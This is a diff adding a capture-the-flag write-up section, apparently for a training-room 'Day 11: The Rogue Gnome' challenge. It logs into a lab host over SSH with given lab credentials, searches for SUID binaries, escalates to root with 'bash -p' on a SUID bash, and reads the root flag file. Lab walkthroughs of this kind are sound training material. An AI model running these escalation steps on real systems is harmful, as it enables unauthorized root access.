@@ -393,9 +393,44 @@ Answer
 
 ## Day 11: The Rogue Gnome
 
+ssh to the server
 
+```
+ssh cmnatic@10.10.11.213
+aoc2020
+```
 
+![image](https://user-images.githubusercontent.com/90561566/218406628-f10475b9-0f57-478e-b4d3-d018975f0661.png)
 
+```
+find / -perm -u=s -type f 2>/dev/null
+```
+
+we have a uid on bash
+
+![image](https://user-images.githubusercontent.com/90561566/218408607-a844b62a-7b39-4e72-896d-dd51998b1c87.png)
+
+search privilege escalate on gtf, i found that
+
+![image](https://user-images.githubusercontent.com/90561566/218410653-5e7e31b2-22fa-4032-9c57-71ae07c1002c.png)
+
+```
+bash -p
+```
+
+![image](https://user-images.githubusercontent.com/90561566/218410728-a7fe02c7-10bd-4762-9a17-b87ea74e3201.png)
+
+```
+cat /root/flag.txt
+```
+
+![image](https://user-images.githubusercontent.com/90561566/218411022-fbf74ada-6337-4193-bf71-8375e8ad171b.png)
+
+Answer:
+
+![image](https://user-images.githubusercontent.com/90561566/218411312-db68ec67-2108-4461-b5a0-2ee7431cd087.png)
+
+## Day 12: Ready, set, elf.
 
 
 
